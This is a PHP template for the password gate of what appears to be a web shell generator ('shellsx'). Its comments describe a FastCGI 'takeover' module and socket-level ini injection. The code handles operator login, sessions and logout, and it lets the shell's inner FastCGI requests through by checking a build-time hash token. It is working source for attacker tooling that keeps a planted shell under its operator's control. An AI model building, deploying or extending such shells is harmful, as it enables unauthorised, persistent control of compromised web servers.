<?php
// Password gate — injected via templates/php.tpl; filled at build (shellsx/auth.py).
//
// Inner FastCGI requests (bypass.php takeover module) are detected and
// authenticated FIRST: they cannot carry a web session, so they present the
// build's own auth hash as a bearer token (never leaves this file; grants
// only the inner probe/trigger/ext modes, which require socket-level ini
// injection to do anything anyway). Valid inner requests skip session
// handling entirely — no session_start(), no Set-Cookie, no throwaway
// sess_* file per request, and no session headers leaking into the
// takeover's FastCGI stdout.
$__AUTH_HASH = '@@AUTH_HASH@@';
$__login_failed = false;
$__authed_inner = (!empty($_SERVER['POC_ROLE'])
    && isset($_SERVER['POC_TOKEN'])
    && $__AUTH_HASH !== ''
    && hash_equals($__AUTH_HASH, $_SERVER['POC_TOKEN']));

if (!$__authed_inner) {
    session_start();
    if (isset($_POST['__auth_pass'])) {
        if (hash_equals($__AUTH_HASH, hash('sha256', $_POST['__auth_pass']))) {
            session_regenerate_id(true);
            $_SESSION['__authed'] = true;
            header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
            exit;
        }
        $__login_failed = true;
    }
    if (isset($_GET['logout'])) {
        session_destroy();
        ob_end_clean();
        header('Content-Type: text/html; charset=UTF-8');
        $___logout_to = strtok($_SERVER['REQUEST_URI'], '?') ?: '.';
        echo '<script>try{sessionStorage.removeItem("__enc_key")}catch(e){}location.replace('
            . json_encode($___logout_to) . ')</script>';
        exit;
    }
    if (empty($_SESSION['__authed'])) {
        ob_end_clean();
        header('Content-Type: text/html; charset=UTF-8');
        if ($__login_failed) {
            echo '<p class="login-error" role="alert">Wrong password</p>';
        }
        /*@@LOGIN_ECHO@@*/
        exit;
    }
}
